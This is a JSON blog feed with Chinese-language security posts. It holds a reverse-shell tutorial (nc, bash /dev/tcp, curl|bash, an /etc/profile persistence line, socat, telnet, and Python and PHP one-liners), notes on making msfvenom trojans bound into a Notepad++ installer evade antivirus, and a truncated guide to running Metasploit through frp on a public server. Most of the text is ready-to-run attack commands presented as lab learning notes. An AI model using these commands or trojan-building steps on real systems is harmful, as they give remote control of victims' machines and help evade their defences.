{
    "version": "https://jsonfeed.org/version/1",
    "title": "Prism Port • All posts by \"linux\" tag",
    "description": "",
    "home_page_url": "https://www.sycamore.top",
    "items": [
        {
            "id": "https://www.sycamore.top/CyberSecurity/%E6%9C%A8%E9%A9%AC/%E5%8F%8D%E5%BC%B9-shell/",
            "url": "https://www.sycamore.top/CyberSecurity/%E6%9C%A8%E9%A9%AC/%E5%8F%8D%E5%BC%B9-shell/",
            "title": "反弹_shell",
            "date_published": "2022-04-23T13:48:27.000Z",
            "content_html": "<h1 id=\"什么是反弹shell\"><a class=\"anchor\" href=\"#什么是反弹shell\">#</a> 什么是反弹 shell？</h1>\n<p><strong>正向连接</strong>，就是攻击者用自己的<strong>攻击机</strong>连接到<strong>目标主机</strong>的某一端口，<strong>常见</strong>的有 web 服务、ssh、远程桌面等等。</p>\n<p>在<strong>实际情况</strong>下，总会有很多时候，我们<strong>不能</strong>通过正向连接访问到目标主机，这个时候就可以利用<strong>反向连接</strong>来实现。</p>\n<p><strong>反向连接</strong>，通俗来说就是，攻击者<strong>监听</strong>某个攻击机的指定端口，目标主机<strong>主动发起请求</strong>到该端口，并将<strong>命令行的输入输出</strong>转到攻击机上显示。</p>\n<h1 id=\"适用情况\"><a class=\"anchor\" href=\"#适用情况\">#</a> 适用情况</h1>\n<p>反弹 shell 适用于如下几种常见的情况：</p>\n<ul>\n<li>目标机因<strong>防火墙</strong>受限，目标机器只能发送请求，不能接收请求。\n<ul>\n<li>所以让目标机<strong>主动发送请求</strong>到攻击机指定端口来 <strong>getshell</strong><br />\n&lt;br&gt;</li>\n</ul>\n</li>\n<li>目标机端口<strong>被占用</strong>。\n<ul>\n<li>但是<strong>攻击机</strong>不会存在什么<strong>端口限制</strong><br />\n &lt;br&gt;</li>\n</ul>\n</li>\n<li>攻击者<strong>无法预知</strong>目标机什么时候会中病毒、木马，对方的网络环境是什么样的，什么时候开关机。\n<ul>\n<li>所以采用 <strong>监听 + 诱骗目标机主动执行某程序</strong> 的方式获得 <strong>shell</strong><br />\n&lt;br&gt;</li>\n</ul>\n</li>\n<li>虽然目标机中了招，但是目标机位于<strong>局域网</strong>，或 IP 会<strong>动态变化</strong>。\n<ul>\n<li>不能获得<strong>可用的 IP</strong> 地址</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"实现方式\"><a class=\"anchor\" href=\"#实现方式\">#</a> 实现方式</h1>\n<p>反弹 shell 的方式有很多，那具体要用哪种方式还需要根据 目标主机的<strong>环境</strong> 来确定，<br />\n比如：</p>\n<ul>\n<li>如果有 <strong>netcat</strong> 或者 <strong>Socat</strong> 或者 <strong>Telnet</strong> 工具，那么可以利用 <strong>任意这三者之一</strong> 反弹 shell，</li>\n<li>如果 <strong>bash</strong> 可用，那么可以利用 bash 反弹 shell，</li>\n<li>如果具有 <strong>python</strong> 或者 <strong>php</strong> 的环境，那么可以利用 <strong>这些语言的脚本</strong> 反弹 shell。</li>\n</ul>\n<h2 id=\"利用-netcat-反弹shell\"><a class=\"anchor\" href=\"#利用-netcat-反弹shell\">#</a> 利用 netcat 反弹 shell</h2>\n<p><strong>Netcat</strong>（即 <strong>nc</strong> ） 是一款简单的 Unix 工具，使用 UDP 和 TCP 协议。它可以轻易的建立任何连接。</p>\n<h3 id=\"准备\"><a class=\"anchor\" href=\"#准备\">#</a> 准备：</h3>\n<p>目前，默认的各个 <strong>linux</strong> 发行版本已经自带了 <strong>netcat</strong> 工具包。</p>\n<p>但是有部分版本的 <strong>netcat</strong> 的 <strong>-e</strong> 功能 被阉割了<br />\n（大概是出于安全考虑，因为 <strong>-e</strong> 可以直接发布与反弹本地 <strong>shell</strong>）</p>\n<p>对于这种情况，需要<strong>手动下载安装包</strong>，命令如下：<br />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget https://jaist.dl.sourceforge.net/project/netcat/netcat/0.7.1/netcat-0.7.1.tar.gz</span><br><span class=\"line\">tar -xvzf netcat-0.7.1.tar.gz</span><br><span class=\"line\">./configure</span><br><span class=\"line\">make &amp;&amp; make install</span><br><span class=\"line\">make clean</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"攻击机开启监听\"><a class=\"anchor\" href=\"#攻击机开启监听\">#</a> 攻击机开启监听：</h3>\n<blockquote>\n<p>格式： <code>nc -lvvp &lt;攻击机监听的端口&gt;</code></p>\n</blockquote>\n<p><code>netcat -lvvp 23333</code> <br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443777/Typera/2023/04/074dea0aeb65e3cf991579314a98284c.png\" alt=\"image-20230426012933906\" /></p>\n<h3 id=\"目标机主动连接攻击机\"><a class=\"anchor\" href=\"#目标机主动连接攻击机\">#</a> 目标机主动连接攻击机：</h3>\n<blockquote>\n<p>格式： <code>nc &lt;攻击机IP&gt; &lt;攻击机监听的端口&gt; -e /bin/bash</code></p>\n</blockquote>\n<p><code>netcat 192.168.158.139 23333 -e /bin/bash</code> <br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443773/Typera/2023/04/f52bbdd3389beb7c7a9e9da72e220e40.png\" alt=\"image-20230426012929850\" /></p>\n<p>（<strong>必须</strong>攻击机<strong>先</strong>开始 <strong>监听</strong>，目标机<strong>再反弹 shell</strong>，这样才会有效果）</p>\n<p>成功反弹 shell：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443770/Typera/2023/04/9284a9b2e6290d96a8b65313b24f91a3.png\" alt=\"image-20230426012926374\" /></p>\n<h2 id=\"利用-bash-反弹-shell\"><a class=\"anchor\" href=\"#利用-bash-反弹-shell\">#</a> 利用 Bash 反弹 shell</h2>\n<p>使用 Bash 中 <strong>网络重定向</strong> 的方法</p>\n<h3 id=\"准备-2\"><a class=\"anchor\" href=\"#准备-2\">#</a> 准备：</h3>\n<p>Kali Linux 中使用的 <strong>Shell</strong> 是 <strong>zsh</strong>，<br />\n可以用命令： <code>echo %SHELL</code>  查看当前系统使用的 <strong>Shell</strong>：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443763/Typera/2023/04/8d5285fdf9ee6db10ebba4ce645ad92c.png\" alt=\"image-20230426012919215\" /></p>\n<p>所以我们需要更换 Shell：</p>\n<ul>\n<li>更换： <code>chsh -s /bin/bash</code></li>\n<li>重启： <code>reboot</code> <br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443759/Typera/2023/04/a9c9ebe071eae7546dacb18ebc0bb277.png\" alt=\"image-20230426012915317\" /></li>\n</ul>\n<p><strong>[注意]：</strong> 出现下图错误只是因为 <strong>攻击机 没开监听</strong>：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443751/Typera/2023/04/8854676b35906672629c5fc26ad8a02f.png\" alt=\"image-20230426012907770\" /></p>\n<p>另外，Debian 中，部分版本可能默认<strong>没开</strong> bash 的 网络重定向 选项，</p>\n<p>对于这种情况，我们只能：加上 <code>--enable-net-redirections</code>  <strong>重新编译 bash</strong><br />\n 详见我的另一篇文章：<a href=\"\">【从源码重新编译 Bash：重定向功能】</a></p>\n<h3 id=\"命令\"><a class=\"anchor\" href=\"#命令\">#</a> 命令：</h3>\n<p>（攻击机<strong>事先</strong>开启 本地监听）</p>\n<blockquote>\n<p>格式： <code>bash -i &gt;&amp; /dev/tcp/攻击机IP/攻击机端口 0&gt;&amp;1</code></p>\n</blockquote>\n<p><code>bash -i &gt;&amp; /dev/tcp/192.168.158.139/23333 0&gt;&amp;1</code></p>\n<p><strong>成功反弹 shell：</strong><br />\n<strong>目标机</strong> 界面 (反弹)：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443746/Typera/2023/04/c693896f2e2fa73809cee178b0f6533b.png\" alt=\"image-20230426012903048\" /></p>\n<p><strong>攻击机</strong> 界面 (监听)：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443743/Typera/2023/04/6fb9f5e48c00f60ba91673a9f6c734eb.png\" alt=\"image-20230426012858851\" /></p>\n<h3 id=\"详细解释\"><a class=\"anchor\" href=\"#详细解释\">#</a> 详细解释：</h3>\n<ul>\n<li><code>bash -i</code>\n<ul>\n<li>产生一个 <strong>bash</strong> 交互环境。</li>\n</ul>\n</li>\n<li><code>&gt;&amp;</code>\n<ul>\n<li>把联合符号 前面 的内容与 后面 相结合，然后一起<strong>重定向</strong>给后者。</li>\n</ul>\n</li>\n<li><code>/dev/tcp/192.168.158.139/23333</code>\n<ul>\n<li><code>/dev/tcp/ip/port</code>  是 <strong>bash</strong> 中定义的一个方法，</li>\n<li>作用是：让攻击机 (192.168.158.139) 和目标机，在攻击机的 23333 端口上，建立一个 <strong>tcp</strong> 连接。</li>\n</ul>\n</li>\n<li><code>0&gt;&amp;1</code>\n<ul>\n<li>0、1 为<strong>文件描述符</strong>。</li>\n<li>即将 <strong>标准输入 (0)</strong> 与 <strong>标准输出 (1)</strong> 的内容相结合，然后<strong>重定向</strong>给前面 <strong>标准输出 (1)</strong> 的内容。（在反弹 shell 中实现 <strong>输入输出</strong> 的关键）</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"curl-配合-bash\"><a class=\"anchor\" href=\"#curl-配合-bash\">#</a> Curl 配合 Bash</h3>\n<p>丰富一下用 Bash 反弹 Shell 的手段<br />\n（Curl 的命令借助了 Linux 中的管道）</p>\n<h4 id=\"1-准备-indexphp-文件\"><a class=\"anchor\" href=\"#1-准备-indexphp-文件\">#</a> 1. 准备 index.php 文件：</h4>\n<p>攻击机中创建  <code>index.php</code>  文件，<br />\n填写的<strong>内容</strong>为：直接使用  <code>Bash</code>  反弹 <strong>Shell</strong> 的情况下，目标机中运行的命令，即：</p>\n<blockquote>\n<p>bash -i &gt;&amp; /dev/tcp/192.168.158.139/23333 0&gt;&amp;1</p>\n</blockquote>\n<p><strong>存放</strong>在 <strong>web</strong> 目录下，<br />\n演示的 <strong>Kali Linux</strong> 虚拟机开启 <strong>Apache2</strong> 服务之后，对应目录为： <code>/var/www/html/</code></p>\n<p>开启 <strong>Apache2</strong> 服务之后，会在上述目录下生成一个  <code>index.php</code>  文件，<br />\n可以直接删去内容并 <strong>修改</strong>，该文件只是生成一个 <strong>web</strong> 页面而已（如下图）<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443737/Typera/2023/04/97eb1b3565e6f8745bf100a9b5ee31ed.png\" alt=\"image-20230426012853268\" /></p>\n<h4 id=\"2-攻击机打开-23333-端口的监听\"><a class=\"anchor\" href=\"#2-攻击机打开-23333-端口的监听\">#</a> 2. 攻击机打开 23333 端口的监听</h4>\n<p>命令： <code>netcat -lvvp 23333</code></p>\n<h4 id=\"3-目标机输入-curl-命令反弹-shell\"><a class=\"anchor\" href=\"#3-目标机输入-curl-命令反弹-shell\">#</a> 3. 目标机输入 Curl 命令反弹 shell</h4>\n<p>命令： <code>curl 192.168.158.139|bash</code></p>\n<p>实现如图：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443723/Typera/2023/04/66bf859ff6c462a364624b51a215fd64.png\" alt=\"image-20230426012839981\" /></p>\n<p>成功反弹 <strong>Shell</strong>：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443715/Typera/2023/04/01742775f569ce91fa25a5f8f25ed544.png\" alt=\"\" /></p>\n<h3 id=\"bash-反弹命令写入-etcprofile-文件\"><a class=\"anchor\" href=\"#bash-反弹命令写入-etcprofile-文件\">#</a> Bash 反弹命令写入 /etc/profile 文件</h3>\n<p>文件  <code>/etc/profile</code>  中的内容，会在 <strong>Bash</strong> 窗口打开时执行。</p>\n<h4 id=\"如图\"><a class=\"anchor\" href=\"#如图\">#</a> 如图：</h4>\n<blockquote>\n<p>（下图中我输入的是<strong>错误的代码</strong>，所以<strong>启动 Bash</strong> 之后，会<strong>输出报错</strong>内容到命令行）<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443705/Typera/2023/04/92211d839dd171dc8f115e037f1e07eb.png\" alt=\"image-20230426012821415\" /><br />\n（如果是<strong>正确的代码</strong>，但是攻击侧<strong>没开监听</strong>，也会报错，如下图：）<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443709/Typera/2023/04/566b0ca11a943f96d0bf550e848d84d4.png\" alt=\"image-20230426012825282\" /></p>\n</blockquote>\n<h4 id=\"布置的步骤\"><a class=\"anchor\" href=\"#布置的步骤\">#</a> 布置的步骤：</h4>\n<p>通过  <code>vim /etc/profile</code> ，编辑文件：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443699/Typera/2023/04/6a8db3c08c0188c7b0a9b1d25fed3c50.png\" alt=\"image-20230426012816962\" /><br />\n&lt;br&gt;</p>\n<ul>\n<li>在末尾添加代码： <code>/bin/bash -i &gt;&amp; /dev/tcp/192.168.158.139/23333 0&gt;&amp;1 &amp;</code></li>\n</ul>\n<blockquote>\n<p>该命令比直接反弹的代码在 <strong>末尾</strong> 多了一个 <strong>&amp;</strong>，<br />\n这是为了让打开 <strong>Bash</strong> 的用户能正常使用</p>\n</blockquote>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443696/Typera/2023/04/bf591833811a31c67bcfb2741ab7ca30.png\" alt=\"image-20230426012812596\" /></p>\n<p><strong>演示：</strong></p>\n<ul>\n<li>攻击机开始监听 23333 端口</li>\n<li><strong>Xshell</strong> 打开目标机的会话（即<strong>启动了 Bash</strong>）<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443691/Typera/2023/04/1fe57f518c02b5c5651dc8fbfe3269c7.png\" alt=\"image-20230426012807425\" /></li>\n<li>没有回显，且攻击机<strong>成功 getshell</strong>，<strong>反弹成功</strong><br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443688/Typera/2023/04/5d329939a4e8d82c53c712f4b54adb09.png\" alt=\"image-20230426012804072\" /></li>\n</ul>\n<h2 id=\"利用-socat-反弹-shell\"><a class=\"anchor\" href=\"#利用-socat-反弹-shell\">#</a> 利用 Socat 反弹 Shell</h2>\n<p><strong>Socat</strong> 是 <strong>Linux</strong> 下一个多功能的网络工具，功能与 <strong>netcat (nc)</strong> 类似。<br />\n所以我们也可以使用 <strong>Socat</strong>，开监听、反弹 <strong>Shell</strong></p>\n<h3 id=\"下载-socat\"><a class=\"anchor\" href=\"#下载-socat\">#</a> 下载 Socat</h3>\n<p>试验之前，要先下载 <strong>Socat</strong>（<strong>Kali Linux</strong> 已经<strong>预装</strong>了该工具），<br />\n如果没有安装，使用命令： <code>apt-get install socat</code></p>\n<h3 id=\"攻击机开启监听-2\"><a class=\"anchor\" href=\"#攻击机开启监听-2\">#</a> 攻击机开启监听</h3>\n<p>命令： <code>socat TCP-LISTEN:23333 -</code> <br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443682/Typera/2023/04/f6ffc230be89565c17383bbe1e8262a3.png\" alt=\"image-20230426012759404\" /></p>\n<h3 id=\"目标机通过-socat-建立连接\"><a class=\"anchor\" href=\"#目标机通过-socat-建立连接\">#</a> 目标机通过 Socat 建立连接</h3>\n<p>命令： <code>socat tcp-connect:192.168.158.139:23333 exec:'bash -li',pty,stderr,setsid,sigint,sane</code> <br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443678/Typera/2023/04/00614ff7b3a1a2dfdfbad02dc0df8be1.png\" alt=\"image-20230426012754642\" /></p>\n<p><strong>成功</strong> 反弹 <strong>Shell</strong>：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443674/Typera/2023/04/7b31e1aa07c5c4bdcbd9e6cafad1655a.png\" alt=\"image-20230426012750258\" /></p>\n<h2 id=\"利用-telnet-反弹-shell\"><a class=\"anchor\" href=\"#利用-telnet-反弹-shell\">#</a> 利用 Telnet 反弹 Shell</h2>\n<p>我们总会遇到，目标机 <strong>Netcat</strong> 和  <code>/dev/tcp/</code>  方法不可用的情况，<br />\n这时候如果 目标机配有 <strong>Telnet</strong> 服务，我们可以用 <strong>Telnet</strong> 建立反向连接。</p>\n<ul>\n<li>攻击机开启监听<br />\n（用 <strong>nc</strong> 或者 <strong>socat</strong> 都行）</li>\n<li>目标机执行命令，建立连接：<br />\n <code>mknod a p; telnet 47.xxx.xxx.72 2333 0&lt;a | /bin/bash 1&gt;a</code> <br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443663/Typera/2023/04/db443fe2827a018ce3cb046f63793326.png\" alt=\"image-20230426012739427\" /></li>\n<li>成功获得 <strong>反弹 Shell</strong>：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443657/Typera/2023/04/d3d507d38eb37d836868b42d5f90db17.png\" alt=\"image-20230426012732507\" /></li>\n</ul>\n<h2 id=\"用-python-脚本反弹-shell\"><a class=\"anchor\" href=\"#用-python-脚本反弹-shell\">#</a> 用 Python 脚本反弹 Shell</h2>\n<p>使用 <strong>Python</strong> 的 <strong>socket</strong> 库</p>\n<p>攻击机开启监听后，直接使用命令：<br />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.158.139&quot;,23333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br></pre></td></tr></table></figure><br />\n（或者也可以转化成 .py 的 Python 文件，然后命令行执行）</p>\n<p>如下图所示：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443651/Typera/2023/04/ff1cae7c81c0b04929f2c86b0e788c9e.png\" alt=\"image-20230426012727025\" /><br />\n 成功反弹 <strong>Shell</strong><br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443647/Typera/2023/04/6826b2f0cec7b82a3677a2e1e86de378.png\" alt=\"image-20230426012721830\" /></p>\n<h2 id=\"用-php-脚本反弹-shell\"><a class=\"anchor\" href=\"#用-php-脚本反弹-shell\">#</a> 用 php 脚本反弹 Shell</h2>\n<p>攻击侧开启监听，目标机执行的 php 脚本如下：<br />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">php -r &#x27;$sock=fsockopen(&quot;192.168.158.139&quot;,23333);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></pre></td></tr></table></figure><br />\n 实现如下：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443639/Typera/2023/04/fdd3929e8cec1fc5e67af1614f47d9b4.png\" alt=\"image-20230426012715771\" /><br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443627/Typera/2023/04/c830f507fd2cc729beb4e10b7a5d18cd.png\" alt=\"image-20230426012702683\" /></p>\n<h2 id=\"最后\"><a class=\"anchor\" href=\"#最后\">#</a> 最后</h2>\n<p>逐一实现了这么多的 <strong>反弹 Shell</strong> 的方法，我发现他们本质上都是一致的。</p>\n<p>无论是用工具还是脚本，都是 建立连接 + 输入输出重定向。</p>\n<p>总得来说，这样一遍下来，最开始读起来较为模糊的原理，现在也能够清晰地理解了。</p>\n",
            "tags": [
                "Linux",
                "Kali",
                "Reverse Shell"
            ]
        },
        {
            "id": "https://www.sycamore.top/CyberSecurity/%E6%9C%A8%E9%A9%AC/%E5%85%8D%E6%9D%80%E6%9C%A8%E9%A9%AC%E6%B5%8B%E8%AF%95/",
            "url": "https://www.sycamore.top/CyberSecurity/%E6%9C%A8%E9%A9%AC/%E5%85%8D%E6%9D%80%E6%9C%A8%E9%A9%AC%E6%B5%8B%E8%AF%95/",
            "title": "免杀木马测试",
            "date_published": "2022-04-18T12:48:36.000Z",
            "content_html": "<div class=\"note default\">\n<p><strong>测试杀软：360 全家桶</strong></p>\n</div>\n<h2 id=\"msf\"><a class=\"anchor\" href=\"#msf\">#</a> MSF</h2>\n<p><code>msfconsole</code></p>\n<ul>\n<li>\n<p><strong>mp_npp:</strong>（2022/4/16）</p>\n<ul>\n<li><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.158.139 LPORT=4444 -x npp.8.1.4.Installer.exe -f exe &gt; mp_npp.exe</code> <br />\n&lt;br&gt;</li>\n<li><strong>监听</strong>：\n<ul>\n<li><code>use exploit/multi/handler</code></li>\n<li><code>set payload windows/meterpreter/reverse_tcp</code></li>\n<li><code>set LHOST 192.168.158.139</code></li>\n<li><code>set LPORT 4444</code></li>\n<li><code>run</code></li>\n</ul>\n</li>\n<li><strong>免杀效果：</strong>\n<ul>\n<li>不能完全通过 <strong>静态扫描</strong>，快速扫描没事，指定文件夹扫描木马会报毒，且运行时会<strong>第一时间</strong>检测出木马</li>\n<li><strong>virustotal</strong> 的检测情况（<strong>40 /  70</strong>）：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudmlydXN0b3RhbC5jb20vZ3VpL2ZpbGUvYzNhN2MyMjgwZTRhYTlhYTA2OTM3MjkwNDlmN2Y4ZTBmZjA1ZTI1M2MxMDQ3ZWYyODI3NDhjMzUwOTY4NzIwNw==\">检测报告</span></li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<p><strong>mp_rc4_npp_i15：</strong>（2022/4/18）</p>\n<ul>\n<li><code>msfvenom -p windows/meterpreter/reverse_tcp_rc4 LHOST=192.168.158.139 LPORT=4444 -e x86/shikata_ga_nai -x npp.8.1.4.Installer.exe -i 15 -f exe &gt; mp_rc4_npp_i15.exe</code> <br />\n&lt;br&gt;</li>\n<li><strong>监听</strong>：\n<ul>\n<li><code>use exploit/multi/handler</code></li>\n<li><code>set payload windows/meterpreter/reverse_tcp_rc4</code></li>\n<li><code>set LHOST 192.168.158.139</code></li>\n<li><code>set LPORT 4444</code></li>\n<li><code>run</code></li>\n</ul>\n</li>\n<li><strong>免杀效果：</strong>\n<ul>\n<li>能过 <strong>360 静态检测</strong>，但会被 <strong>动态检测</strong> 查杀</li>\n<li><strong>virustotal</strong> 的检测情况（<strong>38 /  70</strong>）：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudmlydXN0b3RhbC5jb20vZ3VpL2ZpbGUvODQzOTE0OTNkODJhNTg3OGYyYTJlYWE5NDY1ZTk1YjRlYWUwOWJjODQ4NmQ1MTRjYzE5YTc0MWIxOTE4NzIxYg==\">检测报告</span></li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<p><strong>sh_npp_i27：</strong>（2022/4/18）</p>\n<ul>\n<li><code>msfvenom -p windows/shell_reverse_tcp LHOST=192.168.158.139 LPORT=4444 -e x86/shikata_ga_nai -x npp.8.1.4.Installer.exe -i 27 -f exe &gt; sh_npp_i27.exe</code> <br />\n&lt;br&gt;</li>\n<li><strong>监听</strong>：\n<ul>\n<li><code>use exploit/multi/handler</code></li>\n<li><code>set payload windows/shell_reverse_tcp_rc4</code></li>\n<li><code>set LHOST 192.168.158.139</code></li>\n<li><code>set LPORT 4444</code></li>\n<li><code>run</code></li>\n</ul>\n</li>\n<li><strong>免杀效果：</strong>\n<ul>\n<li>能过 <strong>360 静态检测</strong>，但会被 <strong>动态检测</strong> 查杀</li>\n<li><strong>virustotal</strong> 的检测情况（<strong>35 /  69</strong>）：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudmlydXN0b3RhbC5jb20vZ3VpL2ZpbGUvMGE5NWQzOTBjODE2NWNmY2UxZGQ0Y2U0MDc2NGUyN2RiZmQ4OWJkMzk2YzZhMmE1OGFlNjYyZTYyM2FhNjIzMz9ub2NhY2hlPTE=\">检测报告</span></li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"shellter-捆绑免杀\"><a class=\"anchor\" href=\"#shellter-捆绑免杀\">#</a> shellter 捆绑免杀</h2>\n<ul>\n<li><strong>shellter_npp：</strong>（2022/4/16）\n<ul>\n<li>payload 选择 <strong>shellter 自带</strong>的：Meterpreter_Reverse_TCP （选项 1）</li>\n<li><strong>免杀效果：</strong>\n<ul>\n<li>能过 <strong>360 静态检测</strong>，<strong>动态检测</strong> 报毒会有 <strong>大约一分钟</strong> 的延迟（时间上足够<strong>迁移进程</strong> +<strong> 布置后门</strong>）</li>\n<li><strong>virustotal</strong> 的检测情况（<strong>31 /  70</strong>）<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudmlydXN0b3RhbC5jb20vZ3VpL2ZpbGUvZTRlOTdiZWY4NWYzOTcwZDQyZTgxZDZmNzU4MTUwNTBkN2ZmMjM3MDc5MDg4OGZlOWQ3ODk0OGJjODNiMzBhNw==\">检测报告</span></li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n",
            "tags": [
                "Linux",
                "Kali",
                "Trojan horse",
                "Metasploit",
                "shellter"
            ]
        },
        {
            "id": "https://www.sycamore.top/CyberSecurity/%E6%9C%A8%E9%A9%AC/frp-%E6%90%AD%E5%BB%BA%E5%85%AC%E7%BD%91-Metasploit/",
            "url": "https://www.sycamore.top/CyberSecurity/%E6%9C%A8%E9%A9%AC/frp-%E6%90%AD%E5%BB%BA%E5%85%AC%E7%BD%91-Metasploit/",
            "title": "frp 搭建公网 Metasploit",
            "date_published": "2022-04-18T12:18:36.000Z",
            "content_html": "<h2 id=\"准备\"><a class=\"anchor\" href=\"#准备\">#</a> 准备</h2>\n<ul>\n<li><strong>frps</strong> 部署机。\n<ul>\n<li>要求：拥有 <strong>公网 IP</strong> （例如 <strong>VPS</strong>、云服务器等等）</li>\n<li>本文选用 <strong>Ubuntu 18.04.6</strong> 云服务器</li>\n</ul>\n</li>\n<li><strong>frpc</strong> 客户机。\n<ul>\n<li>要求：能访问互联网</li>\n<li>本文选用 <strong>Kali Linux 2022</strong> 虚拟机</li>\n</ul>\n</li>\n<li><strong>frp</strong> 的 <strong>Github</strong> 项目地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2ZhdGVkaWVyL2ZycA==\">fatedier/frp</span></li>\n</ul>\n<h2 id=\"frps云服务器\"><a class=\"anchor\" href=\"#frps云服务器\">#</a> frps（云服务器）</h2>\n<h3 id=\"下载安装\"><a class=\"anchor\" href=\"#下载安装\">#</a> 下载安装</h3>\n<p><a href=\"https://github.com/fatedier/frp\"><strong>Github</strong> 项目</a> 上找到最新的 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2ZhdGVkaWVyL2ZycC9yZWxlYXNlcw==\">releases</span> ：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682442796/Typera/2023/04/65c0edabf7c4cf7b431c9f10ff94bc05.png\" alt=\"image-20230426011312770\" /></p>\n<ol>\n<li>在 <strong>云服务器</strong> 终端上下载： <code>wget https://github.com/fatedier/frp/releases/download/v0.41.0/frp_0.41.0_linux_amd64.tar.gz</code> <br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682442806/Typera/2023/04/d8b546285137f60d42fef4a27a06d821.png\" alt=\"image-20230426011322302\" /></li>\n<li><strong>解压缩</strong> 下载的文件： <code>tar -zxvf frp_0.41.0_linux_amd64.tar.gz</code> <br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682442811/Typera/2023/04/4063a698f14734b0fb54a92974122ba5.png\" alt=\"image-20230426011327257\" /></li>\n<li><strong>进入</strong> 解压缩的文件夹： <code>cd frp_0.41.0_linux_amd64/</code></li>\n<li>因为配置的是 <strong>frps</strong> ，可以 <strong>删除</strong> 文件夹内的 <strong>frpc</strong> 相关文件，防止后续修改出错：<strong> <code>rm -rf frpc*</code> </strong><br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682442816/Typera/2023/04/f776553aeca109b5eef6a7e0d3d6bacd.png\" alt=\"image-20230426011332064\" /></li>\n</ol>\n<h3 id=\"编写-frps-配置文件\"><a class=\"anchor\" href=\"#编写-frps-配置文件\">#</a> 编写 frps 配置文件</h3>\n<p><code>vim frps.ini</code> <br />\n 内容如下：<br />\n（不想要<strong>监控页面</strong>的话，删除对应配置所在 <strong>行</strong> 即可）<br />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[common]</span><br><span class=\"line\">bind_port = 7777          # frps和frpc的通讯端口</span><br><span class=\"line\">dashboard_port = 9999     # web监控页面的端口</span><br><span class=\"line\">dashboard_user = Sycamore # 登录监控页面的用户名</span><br><span class=\"line\">dashboard_pwd = 123456    # 登录监控页面的密码</span><br></pre></td></tr></table></figure><br />\n 如图所示：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682442822/Typera/2023/04/02f8cca9459920e2f031c95fec4c172e.png\" alt=\"image-20230426011338410\" /><br />\n（需要 <strong>云服务器</strong> 打开 <strong>对应端口</strong>：7777、9999)</p>\n<h3 id=\"运行\"><a class=\"anchor\" href=\"#运行\">#</a> 运行</h3>\n<p>相关命令 <strong>基本上</strong> 应当在 <strong>frp_0.41.0_linux_amd64 文件夹</strong> 下执行～</p>\n<ul>\n<li>命令行输入： <code>./frps -c 